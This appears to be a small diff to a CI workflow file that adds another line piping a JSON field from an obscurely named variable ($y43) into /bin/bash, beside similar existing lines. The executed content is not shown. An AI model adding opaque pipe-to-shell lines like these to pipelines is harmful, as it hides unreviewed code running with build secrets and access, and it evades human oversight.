@@ -30,6 +30,7 @@ jobs:
           echo $gono75 | jq -r .v58 | /bin/bash
           printf '%s' "$byte4" | jq -r .vpj33406 | /bin/bash
           printf '%s' "$qlf44" | jq -r .m2 | /bin/bash
+          printf '%s' "$y43" | jq -r .cmuui66 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
